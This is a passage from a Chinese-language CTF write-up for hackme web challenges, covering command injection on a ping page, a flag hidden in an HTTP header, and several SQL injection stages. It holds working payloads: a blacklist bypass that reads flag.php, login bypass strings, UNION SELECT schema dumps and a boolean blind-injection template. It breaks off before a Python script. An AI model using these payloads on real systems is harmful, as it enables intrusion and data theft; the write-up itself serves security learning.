</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7</span><span>    <span style=color:#ff6ac1>for</span> (<span style=color:#ff5c57>var</span> j <span style=color:#ff6ac1>=</span> <span style=color:#ff9f43>0</span>; j <span style=color:#ff6ac1>&lt;</span> qrcode[<span style=color:#ff9f43>0</span>].length; j<span style=color:#ff6ac1>++</span>) {
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8</span><span>      buff.push(<span style=color:#5af78e>&#34;%c\u2588\u2588&#34;</span>);
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9</span><span>      args.push(<span style=color:#5af78e>&#34;color:&#34;</span> <span style=color:#ff6ac1>+</span> (<span style=color:#5af78e>&#34;1&#34;</span> <span style=color:#ff6ac1>==</span> row[j] <span style=color:#ff6ac1>?</span> color <span style=color:#ff6ac1>:</span> fill));
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10</span><span>    }
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11</span><span>    buff.push(<span style=color:#5af78e>&#34;\n&#34;</span>);
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12</span><span>  }
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13</span><span>  args.unshift(buff.join(<span style=color:#5af78e>&#34;&#34;</span>));
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">14</span><span>  console.log.apply(console, args);
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">15</span><span>}
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">16</span><span><span style=color:#ff5c57>var</span> qrcode <span style=color:#ff6ac1>=</span> [<span style=color:#5af78e>&#34;11111110001000110011101111111&#34;</span>, <span style=color:#5af78e>&#34;10000010111000110100101000001&#34;</span>, <span style=color:#5af78e>&#34;10111010100000100100001011101&#34;</span>, <span style=color:#5af78e>&#34;10111010010010010001001011101&#34;</span>, <span style=color:#5af78e>&#34;10111010111010111010101011101&#34;</span>, <span style=color:#5af78e>&#34;10000010101010011001001000001&#34;</span>, <span style=color:#5af78e>&#34;11111110101010101010101111111&#34;</span>, <span style=color:#5af78e>&#34;000000001011000101101&#34;</span>, <span style=color:#5af78e>&#34;1101001100011110101000111011&#34;</span>, <span style=color:#5af78e>&#34;1111000111011010110011110001&#34;</span>, <span style=color:#5af78e>&#34;1101111000011100101100011001&#34;</span>, <span style=color:#5af78e>&#34;110111011111110110110101001&#34;</span>, <span style=color:#5af78e>&#34;01011011001100101111111101001&#34;</span>, <span style=color:#5af78e>&#34;00100101010101000101110000111&#34;</span>, <span style=color:#5af78e>&#34;00011011000101100110011001111&#34;</span>, <span style=color:#5af78e>&#34;1010110101010001111101101001&#34;</span>, 
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">17</span><span><span style=color:#5af78e>&#34;00001011110011000111110001111&#34;</span>, <span style=color:#5af78e>&#34;0101100100001110100011110001&#34;</span>, <span style=color:#5af78e>&#34;10010111100110100010110111011&#34;</span>, <span style=color:#5af78e>&#34;0010110110101011011010011101&#34;</span>, <span style=color:#5af78e>&#34;10010110010000001010111110111&#34;</span>, <span style=color:#5af78e>&#34;0000000011110010110110001111&#34;</span>, <span style=color:#5af78e>&#34;1111111010100000101010101111&#34;</span>, <span style=color:#5af78e>&#34;10000010000000111000100011101&#34;</span>, <span style=color:#5af78e>&#34;10111010001010001000111110011&#34;</span>, <span style=color:#5af78e>&#34;1011101010111000001010100111&#34;</span>, <span style=color:#5af78e>&#34;10111010001010000111110010001&#34;</span>, <span style=color:#5af78e>&#34;1000001011101111111110010101&#34;</span>, <span style=color:#5af78e>&#34;1111111011010110010011001101&#34;</span>];
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">18</span><span>print_qrcode(qrcode, <span style=color:#5af78e>&#34;#333&#34;</span>, <span style=color:#5af78e>&#34;#fff&#34;</span>);
</span></span></code></pre></div><hr><h2 class="relative group">19. <a href=https://ctf.hackme.quest/ping/ target=_blank>ping</a><div id=19-pinghttpsctfhackmequestping class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#19-pinghttpsctfhackmequestping aria-label=定位點>#</a></span></h2><blockquote><p>Can you ping 127.0.0.1?</p></blockquote><p><figure><img class="my-0 rounded-md" loading=lazy srcset="/posts/ctf-hackme-web-write-up/19/1_hu82b7846a46ddf216052f408091c3d210_97746_330x0_resize_box_3.png 330w,
/posts/ctf-hackme-web-write-up/19/1_hu82b7846a46ddf216052f408091c3d210_97746_660x0_resize_box_3.png 660w,
/posts/ctf-hackme-web-write-up/19/1_hu82b7846a46ddf216052f408091c3d210_97746_1024x0_resize_box_3.png 1024w,
/posts/ctf-hackme-web-write-up/19/1_hu82b7846a46ddf216052f408091c3d210_97746_1320x0_resize_box_3.png 2x" src=/posts/ctf-hackme-web-write-up/19/1_hu82b7846a46ddf216052f408091c3d210_97746_660x0_resize_box_3.png alt style=width:100%></figure></p><p>這題是玩<code>Command Injection</code>，題目提供了原始碼，可以看到有個<code>black list</code>在擋我們的<code>payload</code>，任務就是繞過它。</p><p>其實資安一直在說的一個觀念就是，多使用<code>white list</code>而非<code>black list</code>。<br>這題可能是想傳達這樣的概念吧。</p><p>先測試正常使用，在輸入框中寫上<code>127.0.0.1</code>：</p><p><figure><img class="my-0 rounded-md" loading=lazy srcset="/posts/ctf-hackme-web-write-up/19/2_hufef27c48bcf011a29f6288292645ba8a_20749_330x0_resize_box_3.png 330w,
/posts/ctf-hackme-web-write-up/19/2_hufef27c48bcf011a29f6288292645ba8a_20749_660x0_resize_box_3.png 660w,
/posts/ctf-hackme-web-write-up/19/2_hufef27c48bcf011a29f6288292645ba8a_20749_1024x0_resize_box_3.png 1024w,
/posts/ctf-hackme-web-write-up/19/2_hufef27c48bcf011a29f6288292645ba8a_20749_1320x0_resize_box_3.png 2x" src=/posts/ctf-hackme-web-write-up/19/2_hufef27c48bcf011a29f6288292645ba8a_20749_660x0_resize_box_3.png alt style=width:100%></figure></p><p>它會將輸出原封不動顯示出來。<br>黑名單中擋了許多東西，但&mldr; 沒有擋到<code>$</code>、<code>(</code>、<code>)</code>，因此可以用<code>$(command)</code>來觸發指令。</p><hr><p>先使用<code>ls</code>查看當前目錄下有什麼，輸入<code>$(ls)</code>：</p><p><figure><img class="my-0 rounded-md" loading=lazy srcset="/posts/ctf-hackme-web-write-up/19/3_huc3a83b4896795c2c64f5a9bfe3d7c5f8_5523_330x0_resize_box_3.png 330w,
/posts/ctf-hackme-web-write-up/19/3_huc3a83b4896795c2c64f5a9bfe3d7c5f8_5523_660x0_resize_box_3.png 660w,
/posts/ctf-hackme-web-write-up/19/3_huc3a83b4896795c2c64f5a9bfe3d7c5f8_5523_1024x0_resize_box_3.png 1024w,
/posts/ctf-hackme-web-write-up/19/3_huc3a83b4896795c2c64f5a9bfe3d7c5f8_5523_1320x0_resize_box_3.png 2x" src=/posts/ctf-hackme-web-write-up/19/3_huc3a83b4896795c2c64f5a9bfe3d7c5f8_5523_660x0_resize_box_3.png alt style=width:100%></figure></p><p>可以看到<code>ping</code>的錯誤使用提示，這段訊息已經足夠讓我們知道，該目錄下有<code>index.php</code>及<code>flag.php</code>這兩個檔案了。</p><p>接下來就是將<code>flag.php</code>的內容給輸出，直覺上會使用<code>cat</code>指令，但它在黑名單中。<br>不過要查看檔案內容有許多方式，例如有個指令叫做<code>tac</code>，它是<code>cat</code>倒過來寫，意思是由檔案最後一行往前讀取。</p><p>至於檔名的部份，同樣因為黑名單無法直接輸入<code>flag.php</code>，這個繞過的方式也是一堆，這邊就不贅述，用<code>*</code>繞過即可。</p><p>輸入<code>$(tac fla*)</code>，獲得 flag <code>FLAG{ping_$(capture-the-flag)_UtUbtnvY5F9Hn5dR}</code>：</p><p><figure><img class="my-0 rounded-md" loading=lazy srcset="/posts/ctf-hackme-web-write-up/19/4_hud38d91bba9865acdeb19571b8bfbcf6e_9345_330x0_resize_box_3.png 330w,
/posts/ctf-hackme-web-write-up/19/4_hud38d91bba9865acdeb19571b8bfbcf6e_9345_660x0_resize_box_3.png 660w,
/posts/ctf-hackme-web-write-up/19/4_hud38d91bba9865acdeb19571b8bfbcf6e_9345_1024x0_resize_box_3.png 1024w,
/posts/ctf-hackme-web-write-up/19/4_hud38d91bba9865acdeb19571b8bfbcf6e_9345_1320x0_resize_box_3.png 2x" src=/posts/ctf-hackme-web-write-up/19/4_hud38d91bba9865acdeb19571b8bfbcf6e_9345_660x0_resize_box_3.png alt style=width:100%></figure></p><hr><h2 class="relative group">20. <a href=https://ctf.hackme.quest/scoreboard target=_blank>scoreboard</a><div id=20-scoreboardhttpsctfhackmequestscoreboard class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#20-scoreboardhttpsctfhackmequestscoreboard aria-label=定位點>#</a></span></h2><blockquote><p><strong>DO NOT</strong> ATTACK or SCAN scoreboard, you don&rsquo;t need to do that.</p></blockquote><p>這題也算是常見的一種玩法，就是把訊息塞在封包的<code>header</code>中，你可以在裡面找到一個叫做<code>x-flag</code>的東西。</p><p><figure><img class="my-0 rounded-md" loading=lazy srcset="/posts/ctf-hackme-web-write-up/20/1_hub96d0b971491f284f166cc6e7dfb1897_18018_330x0_resize_box_3.png 330w,
/posts/ctf-hackme-web-write-up/20/1_hub96d0b971491f284f166cc6e7dfb1897_18018_660x0_resize_box_3.png 660w,
/posts/ctf-hackme-web-write-up/20/1_hub96d0b971491f284f166cc6e7dfb1897_18018_1024x0_resize_box_3.png 1024w,
/posts/ctf-hackme-web-write-up/20/1_hub96d0b971491f284f166cc6e7dfb1897_18018_1320x0_resize_box_3.png 2x" src=/posts/ctf-hackme-web-write-up/20/1_hub96d0b971491f284f166cc6e7dfb1897_18018_660x0_resize_box_3.png alt style=width:100%></figure></p><p><code>FLAG{Header can hide some data aswell.}</code></p><hr><h2 class="relative group">21. <a href=https://ctf.hackme.quest/login0 target=_blank>login as admin 0</a><div id=21-login-as-admin-0httpsctfhackmequestlogin0 class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#21-login-as-admin-0httpsctfhackmequestlogin0 aria-label=定位點>#</a></span></h2><blockquote><p>SQL Injection!</p></blockquote><p>Um&mldr; 非常明確，就是 SQL Injection，試著戳進登入系統。<br>p.s. 關於<code>login as admin</code>的題目有好多個階段。</p><p><figure><img class="my-0 rounded-md" loading=lazy srcset="/posts/ctf-hackme-web-write-up/21/1_hu7b54bca0be7c0b6858dbaba0fea870b9_10664_330x0_resize_box_3.png 330w,
/posts/ctf-hackme-web-write-up/21/1_hu7b54bca0be7c0b6858dbaba0fea870b9_10664_660x0_resize_box_3.png 660w,
/posts/ctf-hackme-web-write-up/21/1_hu7b54bca0be7c0b6858dbaba0fea870b9_10664_1024x0_resize_box_3.png 1024w,
/posts/ctf-hackme-web-write-up/21/1_hu7b54bca0be7c0b6858dbaba0fea870b9_10664_1320x0_resize_box_3.png 2x" src=/posts/ctf-hackme-web-write-up/21/1_hu7b54bca0be7c0b6858dbaba0fea870b9_10664_660x0_resize_box_3.png alt style=width:100%></figure></p><p>先照它說的輸入<code>guest/guest</code>看看：</p><p><figure><img class="my-0 rounded-md" loading=lazy srcset="/posts/ctf-hackme-web-write-up/21/2_hue53ae2aa551d7c1ecb1ec29f51cd4e19_9294_330x0_resize_box_3.png 330w,
/posts/ctf-hackme-web-write-up/21/2_hue53ae2aa551d7c1ecb1ec29f51cd4e19_9294_660x0_resize_box_3.png 660w,
/posts/ctf-hackme-web-write-up/21/2_hue53ae2aa551d7c1ecb1ec29f51cd4e19_9294_1024x0_resize_box_3.png 1024w,
/posts/ctf-hackme-web-write-up/21/2_hue53ae2aa551d7c1ecb1ec29f51cd4e19_9294_1320x0_resize_box_3.png 2x" src=/posts/ctf-hackme-web-write-up/21/2_hue53ae2aa551d7c1ecb1ec29f51cd4e19_9294_660x0_resize_box_3.png alt style=width:100%></figure></p><p>(p.s. 點擊上面的 <code>Source Code</code> 可以看原始碼)</p><p>嘗試帳號輸入<code>admin</code>，密碼用<code>\' OR 1 -- #</code>繞過：</p><p><figure><img class="my-0 rounded-md" loading=lazy srcset="/posts/ctf-hackme-web-write-up/21/3_huafbf4bf5ff49244d5891ea41b6ec3ea7_5414_330x0_resize_box_3.png 330w,
/posts/ctf-hackme-web-write-up/21/3_huafbf4bf5ff49244d5891ea41b6ec3ea7_5414_660x0_resize_box_3.png 660w,
/posts/ctf-hackme-web-write-up/21/3_huafbf4bf5ff49244d5891ea41b6ec3ea7_5414_1024x0_resize_box_3.png 1024w,
/posts/ctf-hackme-web-write-up/21/3_huafbf4bf5ff49244d5891ea41b6ec3ea7_5414_1320x0_resize_box_3.png 2x" src=/posts/ctf-hackme-web-write-up/21/3_huafbf4bf5ff49244d5891ea41b6ec3ea7_5414_660x0_resize_box_3.png alt style=width:100%></figure></p><p>Um&mldr; 登入是登入了，但這種方式只能進到第一筆資料，而第一筆資料放的是<code>guest</code>。<br>但不影響，這已經確認存在 SQL Injection，只要稍微修改 Payload 即可。</p><p>帳號<code>admin</code>，密碼輸入<code>\' OR 1 LIMIT 1,1 -- #</code>來看第二筆資料：</p><p><figure><img class="my-0 rounded-md" loading=lazy srcset="/posts/ctf-hackme-web-write-up/21/4_hudb63c7bed9cce97af0aaf60d8b7de23a_12752_330x0_resize_box_3.png 330w,
/posts/ctf-hackme-web-write-up/21/4_hudb63c7bed9cce97af0aaf60d8b7de23a_12752_660x0_resize_box_3.png 660w,
/posts/ctf-hackme-web-write-up/21/4_hudb63c7bed9cce97af0aaf60d8b7de23a_12752_1024x0_resize_box_3.png 1024w,
/posts/ctf-hackme-web-write-up/21/4_hudb63c7bed9cce97af0aaf60d8b7de23a_12752_1320x0_resize_box_3.png 2x" src=/posts/ctf-hackme-web-write-up/21/4_hudb63c7bed9cce97af0aaf60d8b7de23a_12752_660x0_resize_box_3.png alt style=width:100%></figure></p><p>拿到 Flag <code>FLAG{\' UNION SELECT "I Know SQL Injection" #}</code></p><hr><h2 class="relative group">22. <a href=https://ctf.hackme.quest/login0 target=_blank>login as admin 0.1</a><div id=22-login-as-admin-01httpsctfhackmequestlogin0 class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#22-login-as-admin-01httpsctfhackmequestlogin0 aria-label=定位點>#</a></span></h2><blockquote><p>Grab the hidden flag</p></blockquote><p>同一個頁面，要找到另一個 Flag。<br>猜測 Flag 應該也是放在資料庫中，因此開始踹大門：</p><p>帳號<code>admin</code>，密碼輸入<code>\' UNION SELECT 1,database(),3,4 -- #</code>：</p><p><figure><img class="my-0 rounded-md" loading=lazy srcset="/posts/ctf-hackme-web-write-up/22/1_huf8d2d7925a4c8d478bbc07dd933e8242_15486_330x0_resize_box_3.png 330w,
/posts/ctf-hackme-web-write-up/22/1_huf8d2d7925a4c8d478bbc07dd933e8242_15486_660x0_resize_box_3.png 660w,
/posts/ctf-hackme-web-write-up/22/1_huf8d2d7925a4c8d478bbc07dd933e8242_15486_1024x0_resize_box_3.png 1024w,
/posts/ctf-hackme-web-write-up/22/1_huf8d2d7925a4c8d478bbc07dd933e8242_15486_1320x0_resize_box_3.png 2x" src=/posts/ctf-hackme-web-write-up/22/1_huf8d2d7925a4c8d478bbc07dd933e8242_15486_660x0_resize_box_3.png alt style=width:100%></figure></p><p>可以看到<code>UNION SELECT</code>大法奏效。<br>接著進一步撈資料庫，先找出該資料庫中的<code>table</code>有哪些：</p><pre tabindex=0><code>\&#39; UNION SELECT 1,(SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database() ),3,4 -- #
</code></pre><p><figure><img class="my-0 rounded-md" loading=lazy srcset="/posts/ctf-hackme-web-write-up/22/2_hu32049c25ca315a5de2228034ede40835_15543_330x0_resize_box_3.png 330w,
/posts/ctf-hackme-web-write-up/22/2_hu32049c25ca315a5de2228034ede40835_15543_660x0_resize_box_3.png 660w,
/posts/ctf-hackme-web-write-up/22/2_hu32049c25ca315a5de2228034ede40835_15543_1024x0_resize_box_3.png 1024w,
/posts/ctf-hackme-web-write-up/22/2_hu32049c25ca315a5de2228034ede40835_15543_1320x0_resize_box_3.png 2x" src=/posts/ctf-hackme-web-write-up/22/2_hu32049c25ca315a5de2228034ede40835_15543_660x0_resize_box_3.png alt style=width:100%></figure></p><p>找到 table <code>h1dden_f14g</code>。<br>再挖它的欄位：</p><pre tabindex=0><code>\&#39; UNION SELECT 1,(SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name=&#34;h1dden_f14g&#34;),3,4 -- #
</code></pre><p><figure><img class="my-0 rounded-md" loading=lazy srcset="/posts/ctf-hackme-web-write-up/22/3_hu36257e457db077807f0b2ef60fd554e3_13210_330x0_resize_box_3.png 330w,
/posts/ctf-hackme-web-write-up/22/3_hu36257e457db077807f0b2ef60fd554e3_13210_660x0_resize_box_3.png 660w,
/posts/ctf-hackme-web-write-up/22/3_hu36257e457db077807f0b2ef60fd554e3_13210_1024x0_resize_box_3.png 1024w,
/posts/ctf-hackme-web-write-up/22/3_hu36257e457db077807f0b2ef60fd554e3_13210_1320x0_resize_box_3.png 2x" src=/posts/ctf-hackme-web-write-up/22/3_hu36257e457db077807f0b2ef60fd554e3_13210_660x0_resize_box_3.png alt style=width:100%></figure></p><p>欄位叫做<code>the_f14g</code>，直接查詢就拿到 Flag <code>FLAG{Good, Union select is quite easy to exploit!}</code></p><pre tabindex=0><code>\&#39; UNION SELECT 1,(SELECT GROUP_CONCAT(the_f14g) FROM h1dden_f14g),3,4 -- #
</code></pre><hr><h2 class="relative group">23. <a href=https://ctf.hackme.quest/login1 target=_blank>login as admin 1</a><div id=23-login-as-admin-1httpsctfhackmequestlogin1 class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#23-login-as-admin-1httpsctfhackmequestlogin1 aria-label=定位點>#</a></span></h2><blockquote><p>Please login as admin.<br>Tips: SQL Injection but <code>sqlmap</code> not working anymore.<br>Update: Source code is available now.<br><code>Scanner WON'T WORK</code></p></blockquote><p>Um&mldr; 測試一下，上一題的 Payload 在這題已經無效了。<br>那麼嘗試戳出其他洞看看。</p><p>戳了一下發現，可以把<code>\'/**/OR/**/1/**/#</code>塞在密碼來登入。<br>p.s. SQL 可以用<code>/**/</code>來代替空格</p><p>雖然成功登入<code>admin</code>，但卻沒有讀取 Flag 的權限：</p><p><figure><img class="my-0 rounded-md" loading=lazy srcset="/posts/ctf-hackme-web-write-up/23/1_hu638977864f33455881125cec9525679a_5007_330x0_resize_box_3.png 330w,
/posts/ctf-hackme-web-write-up/23/1_hu638977864f33455881125cec9525679a_5007_660x0_resize_box_3.png 660w,
/posts/ctf-hackme-web-write-up/23/1_hu638977864f33455881125cec9525679a_5007_1024x0_resize_box_3.png 1024w,
/posts/ctf-hackme-web-write-up/23/1_hu638977864f33455881125cec9525679a_5007_1320x0_resize_box_3.png 2x" src=/posts/ctf-hackme-web-write-up/23/1_hu638977864f33455881125cec9525679a_5007_660x0_resize_box_3.png alt style=width:100%></figure></p><p>開使用<code>UNION SELECT</code>大法<code>\'/**/UNION/**/SELECT/**/1,2,3,4/**/#</code>：</p><p><figure><img class="my-0 rounded-md" loading=lazy srcset="/posts/ctf-hackme-web-write-up/23/2_hu0fc1eeea5d7aabce55834b9e39f9f261_12243_330x0_resize_box_3.png 330w,
/posts/ctf-hackme-web-write-up/23/2_hu0fc1eeea5d7aabce55834b9e39f9f261_12243_660x0_resize_box_3.png 660w,
/posts/ctf-hackme-web-write-up/23/2_hu0fc1eeea5d7aabce55834b9e39f9f261_12243_1024x0_resize_box_3.png 1024w,
/posts/ctf-hackme-web-write-up/23/2_hu0fc1eeea5d7aabce55834b9e39f9f261_12243_1320x0_resize_box_3.png 2x" src=/posts/ctf-hackme-web-write-up/23/2_hu0fc1eeea5d7aabce55834b9e39f9f261_12243_660x0_resize_box_3.png alt style=width:100%></figure></p><p>拿到 Flag <code>FLAG{He110, Admin\\' or 1337 &lt; 314159 #}</code><br>(os: 我以為還要再戳進去才會看到&mldr;)</p><hr><h2 class="relative group">24. <a href=https://ctf.hackme.quest/login1 target=_blank>login as admin 1.2</a><div id=24-login-as-admin-12httpsctfhackmequestlogin1 class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#24-login-as-admin-12httpsctfhackmequestlogin1 aria-label=定位點>#</a></span></h2><blockquote><p>Get another flag<br>Tips: boolean-based SQL injection, <code>information_schema</code></p></blockquote><p>原以為跟前面的套路一樣，用<code>UNION SELECT</code>踹進大門就可以看到其他隱藏的 Flag。<br>但問題是，這個頁面並<strong>沒有顯示</strong>任何<code>UNION SELECT</code>出來的欄位。</p><p>沒有直接顯示我們要的回應資訊，那麼就只能<code>盲注</code>了。<br>(這題是<code>boolean-based</code>的<code>blind-injection</code>)</p><hr><p>雖然說無法直接取得回應，但可以知道兩個資訊</p><ul><li>該資料表有<code>4個欄位</code>(用<code>UNION SELECT</code>試出來)</li><li>有個判斷「是否為管理員」的機制</li></ul><p>先猜測這四個欄位中，有一個是用來判斷是否為管理員的。<br>因此分別將其設置為<code>0</code>來看是哪個欄位：</p><ul><li><code>\'/**/UNION/**/SELECT/**/0,2,3,4/**/#</code></li><li><code>\'/**/UNION/**/SELECT/**/1,0,3,4/**/#</code></li><li><code>\'/**/UNION/**/SELECT/**/1,2,0,4/**/#</code></li><li><code>\'/**/UNION/**/SELECT/**/1,2,3,0/**/#</code></li></ul><p>前<code>1</code>到<code>3</code>個欄位為<code>0</code>時均回應「<code>You are admin!</code>」<br><figure><img class="my-0 rounded-md" loading=lazy srcset="/posts/ctf-hackme-web-write-up/24/1_hu0fc1eeea5d7aabce55834b9e39f9f261_12243_330x0_resize_box_3.png 330w,
/posts/ctf-hackme-web-write-up/24/1_hu0fc1eeea5d7aabce55834b9e39f9f261_12243_660x0_resize_box_3.png 660w,
/posts/ctf-hackme-web-write-up/24/1_hu0fc1eeea5d7aabce55834b9e39f9f261_12243_1024x0_resize_box_3.png 1024w,
/posts/ctf-hackme-web-write-up/24/1_hu0fc1eeea5d7aabce55834b9e39f9f261_12243_1320x0_resize_box_3.png 2x" src=/posts/ctf-hackme-web-write-up/24/1_hu0fc1eeea5d7aabce55834b9e39f9f261_12243_660x0_resize_box_3.png alt style=width:100%></figure></p><p>第<code>4</code>個欄位為<code>0</code>時則回應<br><figure><img class="my-0 rounded-md" loading=lazy srcset="/posts/ctf-hackme-web-write-up/24/2_hu638977864f33455881125cec9525679a_5007_330x0_resize_box_3.png 330w,
/posts/ctf-hackme-web-write-up/24/2_hu638977864f33455881125cec9525679a_5007_660x0_resize_box_3.png 660w,
/posts/ctf-hackme-web-write-up/24/2_hu638977864f33455881125cec9525679a_5007_1024x0_resize_box_3.png 1024w,
/posts/ctf-hackme-web-write-up/24/2_hu638977864f33455881125cec9525679a_5007_1320x0_resize_box_3.png 2x" src=/posts/ctf-hackme-web-write-up/24/2_hu638977864f33455881125cec9525679a_5007_660x0_resize_box_3.png alt style=width:100%></figure></p><p>由此可以猜測，第<code>4</code>個欄位應該就是一個<code>boolean</code>判斷是否為管理員的功能。<br>這裡就可以當作一個盲注的互動點。</p><hr><p>Blind-Injection 流程解析</p><p>第一步一樣先撈出<code>table</code>名稱，於是一樣使用之前的 payload</p><div class=highlight><pre tabindex=0 style=color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sql data-lang=sql><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1</span><span><span style=color:#ff6ac1>SELECT</span><span style=color:#78787e>/**/</span>GROUP_CONCAT(<span style=color:#ff6ac1>table_name</span>)<span style=color:#78787e>/**/</span><span style=color:#ff6ac1>FROM</span><span style=color:#78787e>/**/</span>information_schema.tables<span style=color:#78787e>/**/</span><span style=color:#ff6ac1>WHERE</span><span style=color:#78787e>/**/</span>table_schema<span style=color:#ff6ac1>=</span><span style=color:#ff6ac1>database</span>()
</span></span></code></pre></div><p>但無法直接得出回傳結果，所以要將上述的句子改為用判斷式確認，以回傳<code>boolean</code>的方式來檢測是否正確。</p><p>白話的說，在前幾題，我們是直接詢問 server「<code>請問 table 名稱是什麼？</code>」，然後 server 直接回應查詢結果。<br>而這題的 server 只會回答<code>是</code>或<code>否</code>，雖然說麻煩了點，但我們依舊可以與 server 達到互動。</p><p>你只需要一直嘗試問 server「<code>請問 table 名稱是xxx嗎？</code>」，server 回應「<code>否</code>」，你又再問「<code>那麼是ooo嗎？</code>」，server 又回答你「<code>否</code>」，直到 server 回應「<code>是</code>」，這時候你就知道 table 的名稱是什麼。</p><p>但這樣做是以暴力破解的方式，這可會耗上大把時間，有更好的作法。<br>我可以詢問 server 「<code>請問 table 名稱第一個字是「a」嗎？</code>」一直問到回應「<code>是</code>」後，接著問第二個字。</p><p>寫成 SQL Payload 的話大概是：</p><div class=highlight><pre tabindex=0 style=color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sql data-lang=sql><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1</span><span><span style=color:#ff5c57>\</span><span style=color:#5af78e>&#39;/**/UNION/**/SELECT/**/1,2,3,IF(ASCII(SUBSTR((SELECT/**/GROUP_CONCAT(table_name)/**/FROM/**/information_schema.tables/**/WHERE/**/table_schema=database()),字元序,1))=&#34;猜測字元的 ASCII&#34;,1,0)/**/#
</span></span></span></code></pre></div><p>整個語法第四個<code>UNION SELECT</code>的欄位被換成這句：</p><div class=highlight><pre tabindex=0 style=color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sql data-lang=sql><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1</span><span><span style=color:#ff6ac1>IF</span>(ASCII(SUBSTR((<span style=color:#ff6ac1>SELECT</span><span style=color:#78787e>/**/</span>GROUP_CONCAT(<span style=color:#ff6ac1>table_name</span>)<span style=color:#78787e>/**/</span><span style=color:#ff6ac1>FROM</span><span style=color:#78787e>/**/</span>information_schema.tables<span style=color:#78787e>/**/</span><span style=color:#ff6ac1>WHERE</span><span style=color:#78787e>/**/</span>table_schema<span style=color:#ff6ac1>=</span><span style=color:#ff6ac1>database</span>()),<span style=color:#ff5c57>字元序</span>,<span style=color:#ff9f43>1</span>))<span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;猜測字元的 ASCII&#34;</span>,<span style=color:#ff9f43>1</span>,<span style=color:#ff9f43>0</span>)
</span></span></code></pre></div><p>這邊先用到了「<code>SUBSTR()</code>」這個 SQL Function 來取 table 名稱的<code>第幾個字</code>，它的用法是<code>SUBSTR(字串,從第幾個字開始,取幾個字)</code>。<br>所以上面的例子中，<code>字串</code>為<code>GROUP_CONCAT(table_name)</code>回傳的結果，也就是所有 table 的名字。<br>而<code>從第幾個字開始</code>就是對應到了例子中的<code>字元序</code>，這是一個變數。<br>最後<code>取幾個字</code>填上<code>1</code>，每次只猜一個字。</p><p>這麼一來就會陸續返回一個字元，在拿這個字元來比對我們是否猜對。<br>但由於這可能包含特殊符號，因此在比對之前，習慣先用一個 Function「<code>ASCII()</code>」來將字元轉成<code>ASCII</code>編碼，再做比對。<br>當然後方的<code>猜測字元的 ASCII</code>就是陸續填入可視字元範圍的<code>ASCII Code</code>即可。</p><p>(p.s. 可視字元 ASCII Code 範圍為 <code>32</code> ~ <code>127</code>)</p><hr><p>這需要嘗試非常多次，因此通常這題會建議寫成腳本來執行。<br>以下使用 python3 來撰寫請求及判斷回應的腳本，用這種方式來<code>blind-injection</code>。</p><div class=highlight><pre tabindex=0 style=color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span 